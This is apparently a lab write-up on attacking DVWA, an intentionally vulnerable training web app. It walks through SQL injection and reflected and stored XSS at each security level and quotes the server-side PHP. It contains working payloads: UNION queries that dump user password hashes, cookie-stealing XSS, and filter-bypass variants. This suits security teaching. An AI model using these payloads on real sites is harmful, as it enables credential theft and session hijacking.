## SQL Injection Analysis

### Low Security Level

#### Determine whether the injection is successful and whether the injection is character type or numeric type

Input: `1`, query successful

<div style="text-align:left"><img style="max-width:40%;height:auto;" src="https://i.loli.net/2021/04/22/OhfSPRgLVUTsjeQ.png"></div>

Input: `1' and '1'='2`, the query fails and the returned result is empty

<div style="text-align:left"><img style="max-width:35%;height:auto;" src="https://i.loli.net/2021/04/22/ELUNqVzv8SywTPo.png"></div>

Input: `1' or '1'='1`, the query is successful and multiple results are returned

<div style="text-align:left"><img style="max-width:35%;height:auto;" src="https://i.loli.net/2021/04/22/onghDWQuNekj9M8.png"></div>

From the above three attempts, we can know that there is a character injection vulnerability here.

#### Guess the number of fields in the SQL query statement

Input: `1' or 1=1 order by 1 #`, the query is successful

<div style="text-align:left"><img style="max-width:35%;height:auto;" src="https://i.loli.net/2021/04/22/b4PnEiIaByH6NlR.png"></div>

Input: `1' or 1=1 order by 2 #`, the query is successful

<div style="text-align:left"><img style="max-width:35%;height:auto;" src="https://i.loli.net/2021/04/22/fFiZs1RtlAwcOu9.png"></div>

Input: `1' or 1=1# order by 3 #`, the query failed. Note that there are only two fields in the SQL query statement executed, namely First name and Surname in the figure.

<div style="text-align:left"><img style="max-width:40%;height:auto;" src="https://i.loli.net/2021/04/20/4TN6wR2PDsSxQyb.png"></div>

You can also enter here:

```sql
'union select 1,2 #
```

Let’s guess the number of fields

<div style="text-align:left"><img style="max-width:30%;height:auto;" src="https://i.loli.net/2021/04/20/SkxuDwLe4z6tNZQ.png"></div>

If you enter `'union select 1,2,3 #`, an error will be reported

<div style="text-align:left"><img style="max-width:60%;height:auto;" src="https://i.loli.net/2021/04/20/3ZvGDRuUTh6S2Cs.png"></div>

#### Get the current database name

The command `'union select user(), database()#` returns the result as shown below, indicating that the current database name is dvwa

<div style="text-align:left"><img style="max-width:40%;height:auto;" src="https://i.loli.net/2021/04/20/ahjTktcDROWX63z.png"></div>

#### Get the name of the table in the current database

Command `' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() #'`, the return result is as shown below

![image-20210420215005573](https://i.loli.net/2021/04/20/2n4Iiz9tDVLlmFk.png)

#### Get the field name in the table

The command `'union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users'#` returns the result as shown below. There are fields such as `user_id`, `first_name`, `user` and `password` in the table.

![image-20210420215005573](https://i.loli.net/2021/04/20/jw5hfxT8bsSOg6d.png)

#### Try to get `user` and `password`

Enter the command and the result will be returned as shown in the figure

```sql
' union select user, password from users #
```

<div style="text-align:left"><img style="max-width:40%;height:auto;" src="https://i.loli.net/2021/04/22/iAZYdU9FTk35woa.png"></div>

#### Try to crack the password

The password has 3 digits in total. Guess its md5 hash value. With the help of the md5 hash value query website http://pmd5.com, you can quickly parse the password as follows

```
5f4dcc3b5aa765d61d8327deb882cf99--password
e99a18c428cb38d5f260853678922e03--abc123
8d3533d75ae2c3966d7e0d4fcc69216b--charley
0d107d09f5bbe40cade3de5c71e9e9b7--letmein
5f4dcc3b5aa765d61d8327deb882cf99--password
```

#### View page source code

Click `View Source` in the lower right corner to view the source code

<div style="text-align:left"><img style="max-width:80%;height:auto;" src="https://i.loli.net/2021/04/22/u7KxmMdU2wj9LNo.png"></div>

### medium security level

#### Determine whether there is injection and whether the injection is character type or numeric type

Use Burpsuite to capture packets and change the parameter id to: `1' or 1=1#`, as shown in the figure

![image-20210422200815904](https://i.loli.net/2021/04/22/2RDCagxl1WNeI5L.png) returns error information, as shown in the figure below

![image-20210422212045331](https://i.loli.net/2021/04/22/ugOn9UqGQbhP16j.png)

Capture the packet and change the parameter id to: `1 or 1=1 #`, the query is successful.

<div style="text-align:left"><img style="max-width:30%;height:auto;" src="https://i.loli.net/2021/04/22/uAvGHh2iSOFgkfb.png"></div>

Indicates the existence of digital injection. Since it is a numeric injection, the server's `mysql_real_escape_string` function is useless, because numeric injection does not require the use of quotes.

#### Guess the number of fields in the SQL query statement

Capture the packet and change the parameter id to: `1 order by 2 #`, the query is successful

Capture the packet and change the parameter id to: `1 order by 3 #`, and return an error message

<div style="text-align:left"><img style="max-width:30%;height:auto;" src="https://i.loli.net/2021/04/22/ne7hxkBIlRz8F9m.png"></div>

<div style="text-align:left"><img style="max-width:30%;height:auto;" src="https://i.loli.net/2021/04/22/kCOnseJKZQ8tFGH.png"></div>

Note that there are only two fields in the executed SQL query statement, namely First name and Surname.

Next, the operations of determining the order of displayed fields, getting the current database name, getting the table name in the database, getting the field names in the table, and getting field information are basically the same as those at the low security level. They can all be completed by modifying the parameters and resubmitting through Burpsuite. .

### high security level

Looking at the source code, you can see that the high level code only adds `LIMIT 1`, hoping to control only one result to be output. Although `LIMIT 1` was added, it can be commented out via `#`. Since the manual injection process is basically the same as the low level, enter the following command directly.

```sql
' union select group_concat(user_id, first_name, last_name), group_concat(password) from users #
```

![image-20210422215224563](https://i.loli.net/2021/04/22/Of8KSi1esCAXP4v.png)

### impossible security level

Looking at the source code, you can see that the impossible-level code uses PDO technology to draw a clear line between code and data, which can effectively prevent SQL injection. At the same time, only when the number of returned query results is 1, it will be successfully output, so that Effectively prevents "taking off pants". In addition, the addition of Anti-CSRFtoken mechanism further improves security.

![image-20210422215507154](https://i.loli.net/2021/04/22/dnuXoLCS6Iafsk4.png)

## Reflective XSS vulnerability exploitation analysis

### low security level

Enter a random username hello in the text box, and it will be displayed on the page after submission, as shown in the figure.

As can be seen in the URL, the username is submitted as a GET parameter via the name parameter.

<div style="text-align:left"><img style="max-width:55%;height:auto;" src="https://i.loli.net/2021/04/22/WHtz3oJjLkPiayU.png"></div>

Continue to try to enter the XSS attack command inside, as follows:

```javascript
<script>alert("hello")</script>
```

After submission, the dialog box that pops up will appear as shown in the figure.

<div style="text-align:left"><img style="max-width:45%;height:auto;" src="https://i.loli.net/2021/04/22/l3yGCc941PuWFAp.png"></div>

The request header is as follows:

![image-20210422221312603](https://i.loli.net/2021/04/22/XLyUfvi8AcYEq1s.png)

Viewing the web page source code through developer tools, you can find that the results returned by the server part are as follows:

```html
<h1>Vulnerability: Reflected Cross Site Scripting (XSS)</h1>

<div class="vulnerable_code_area">
<form name="XSS" action="#" method="GET">
<p>
What's your name?
<input type="text" name="name">
<input type="submit" value="Submit">
</p>

</form>
<pre>Hello <script>alert("hello")</script></pre>
</div>
```

You can see that the entered script is embedded in the web page, and there is an XSS vulnerability here.

Therefore, local data can be obtained by implanting malicious scripts, for example, entering the following code:

```javascript
<script>alert(document.cookie)</script>
```

After submission, the dialog box pops up as shown in the figure, and the Cookie value is returned. The attacker can directly use this cookie to forge a login.

<div style="text-align:left"><img style="max-width:50%;height:auto;" src="https://i.loli.net/2021/04/22/zAKu2XPqIrFyJTN.png"></div>

View low-security server-side code.

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
     // Feedback for end user
     echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

It can be seen that the code directly references the `name` parameter without any filtering and checking, and there is an obvious XSS vulnerability.

### medium security level

The server-side source code for medium security level is as follows:

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
     // Get input
     $name = str_replace( '<script>', '', $_GET[ 'name' ] );

     // Feedback for end user
     echo "<pre>Hello ${name}</pre>";
}

?>
```

As you can see, the input is filtered here. Based on the idea of ​​blacklist, the `str_replace()` function is used to delete `<script>` in the input. However, this protection mechanism can be easily bypassed.

For example, it can be bypassed by using case confusion. For example, the following statement can still pop up the dialog box.

```javascript
<Script>alert("hello")</Script>
```

<div style="text-align:left"><img style="max-width:45%;height:auto;" src="https://i.loli.net/2021/04/22/l3yGCc941PuWFAp.png"></div>

You can also use double writing to avoid filtering. For example, the following statement can also pop up a dialog box.

```javascript
<sc<script>ript>alert("hello")</script>
```

### high security level

Source code:

```javascript
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
     // Get input
     $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name ' ] );

     // Feedback for end user
     echo "<pre>Hello ${name}</pre>";
}

?>
```

It can be seen that high-level code also applies to blacklist filtering input. The `grep_replace()` function is used for search and replacement of regular expressions, which allows double-write bypass and case confusion bypass (i in regular expressions) means case-insensitive) is no longer valid.

Although XSS code cannot be injected using the `<script>` tag, malicious js code can be injected through events of tags in HTML languages such as `img` and `body` or through the src of tags such as `iframe`.

For example the following code:

```javascript
<img src=1 onerror=alert("hello")>
```

The popup dialog can still be successfully implemented.

### impossible security level

Source code:

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
     // Check Anti-CSRF token
     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

     // Get input
     $name = htmlspecialchars( $_GET[ 'name' ] );

     // Feedback for end user
     echo "<pre>Hello ${name}</pre>";
}

//Generate Anti-CSRF token
generateSessionToken();

?>
```

As you can see, the impossible-level code uses the `htmlspecialchars()` function to convert the predefined characters `&`, `''`, `'`, `<`, `>` into HTML entities to prevent the browser from converting them. as HTML elements.

## Stored XSS vulnerability exploitation analysis

### low security level

Source code:

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
     // Get input
     $message = trim( $_POST[ 'mtxMessage' ] );
     $name = trim( $_POST[ 'txtName' ] );

     // Sanitize message input
     $message = stripslashes( $message );
     $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

     // Sanitize name input
     $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

     // Update database
     $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
     $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

     //mysql_close();
}

?>
```

It can be seen that using `trim()`, `stripslashes()`, and `mysql_real_escape_string()` can only prevent SQL injection vulnerabilities. This code does not perform XSS filtering and checking, so there is an obvious stored XSS vulnerability here.

Enter: `<script>alert("hello")</script>` in the Message text box, and the dialog box will pop up successfully.

<div style="text-align:left"><img style="max-width:45%;height:auto;" src="https://i.loli.net/2021/04/22/f4nXPRatJHg1VDo.png"></div>

The Name text box has a word limit, but you can still modify the parameters through Burpsuite capture and submit, and the dialog box can also pop up successfully.

![image-20210422225805626](../../../../Library/Application Support/typora-user-images/image-20210422225805626.png)

<div style="text-align:left"><img style="max-width:45%;height:auto;" src="https://i.loli.net/2021/04/22/tjQhPAZLMFY1mUd.png"></div>

Of course, popping up a dialog box is not the purpose. One of the main uses of XSS is to steal cookies, that is, automatically sending the user's cookies to the attacker.

### Medium Level

Source code：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?> 
```

Two functions `strip_tags()` and `addslashes()` have been added. You can see that the `message` parameter is encoded using the `htmlspecialchars()` function, so XSS code can no longer be injected through the `message` parameter. But for the `name` parameter, the `<script>` string is simply filtered, and there is still a stored XSS vulnerability.

Can be bypassed using case obfuscation. Use Burpsuite to capture packets and modify the `name` parameter to:

```javascript
<Script>alert("hello")</Script>
```

<div style="text-align:left"><img style="max-width:85%;height:auto;" src="https://i.loli.net/2021/04/22/An2Sz9fFNLhyUQY.png"></div>

```javascript
<s<script>cript>alert("hello")</script>
```

<div style="text-align:left"><img style="max-width:70%;height:auto;" src="https://i.loli.net/2021/04/22/b1dLKWEOyUsmvZz.png"></div>

### high level

Source Code：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?> 
```

It can be seen that although the `<script` tag is filtered using regular expressions, other dangerous tags such as `img` and `iframe` are ignored, so the `name` parameter still has a stored XSS vulnerability.

You can capture the packet and modify the `name` parameter as:

```html
<img src=1 onerror=alert(1)>
```

<div style="text-align:left"><img style="max-width:70%;height:auto;" src="https://i.loli.net/2021/04/22/m92CRgoOVjvKZzQ.png"></div>

Successfully implemented pop-up dialog box

### impossible security level

Source code:

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
     // Check Anti-CSRF token
     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

     // Get input
     $message = trim( $_POST[ 'mtxMessage' ] );
     $name = trim( $_POST[ 'txtName' ] );

     // Sanitize message input
     $message = stripslashes( $message );
     $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
     $message = htmlspecialchars( $message );

     // Sanitize name input
     $name = stripslashes( $name );
     $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
     $name = htmlspecialchars( $name );

     // Update database
     $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
     $data->bindParam( ':message', $message, PDO::PARAM_STR );
     $data->bindParam( ':name', $name, PDO::PARAM_STR );
     $data->execute();
}

//Generate Anti-CSRF token
generateSessionToken();

?>
```

As you can see, this code uses the `htmlspecialchars()` function to solve the XSS vulnerability. However, it should be noted that if the `htmlspecialchars()` function is used improperly, attackers can still bypass the function through coding to perform XSS injection, especially DOM-type XSS vulnerabilities.
